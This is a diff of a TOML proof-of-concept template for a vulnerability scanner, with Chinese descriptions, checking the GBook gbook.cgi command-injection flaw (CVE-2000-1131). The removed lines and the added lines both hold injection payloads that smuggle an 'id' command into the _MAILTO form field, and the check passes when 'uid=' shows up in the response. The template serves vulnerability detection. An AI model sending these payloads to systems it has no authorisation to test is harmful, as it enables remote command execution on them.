@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测 GBook 留言簿 CGI 程序 gbook.cgi 是否存在命令注入漏洞，通过向 _MAILTO 表单变量注入 shell 元字符（如分号、管道符）执行系统命令"
+author = "ave"
+description = "检测目标是否存在 Bill Kendrick GBook gbook.cgi 命令注入漏洞，通过向 _MAILTO 表单变量注入 Shell 元字符验证远程命令执行能力"
 id = "POC-AVE-2000-1099"
-name = "GBook gbook.cgi 远程命令执行 PoC"
+name = "CVE-2000-1131 PoC"
 severity = "high"
 tags = ["ave-2000-1099"]
 vuln_id = [
@@ -11,30 +11,16 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cgi-bin/gbook.cgi?_MAILTO=test@test.com;id&_COMMAND=add"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["uid="]
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/gbook.cgi"
+path = "/gbook/gbook.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "_MAILTO=test@test.com%3Bid&_COMMAND=add"
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
+content = "_MAILTO=|id"
+type = "form"
 
 [[poc.requests.matchers]]
 expect = true
